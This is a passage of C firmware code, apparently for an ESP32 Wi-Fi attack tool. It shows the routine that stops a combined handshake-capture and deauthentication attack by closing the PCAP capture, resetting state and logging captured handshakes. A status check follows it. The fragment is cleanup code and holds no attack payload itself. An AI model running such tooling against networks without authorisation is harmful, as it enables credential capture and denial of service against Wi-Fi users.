    }

    // Stop promiscuous mode and close PCAP
    esp_wifi_set_promiscuous(false);
    pcap_file_close();

    handshake_deauth_task_running = false;
    handshake_deauth_stop_requested = false;
    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
    esp_wifi_stop();
    (void)ap_manager_restore_after_attack("hs+deauth stop");
    status_display_show_status("HS+Deauth Stopped");

    glog("Handshake+Deauth stopped. %" PRIu32 " handshakes captured.\n", handshake_deauth_handshake_count);
    ghostscript_emit_event("attack_stopped", "handshake_deauth");
    return true;
}

bool deauth_attack_handshake_deauth_is_running(void) {
    return handshake_deauth_task_running;
}
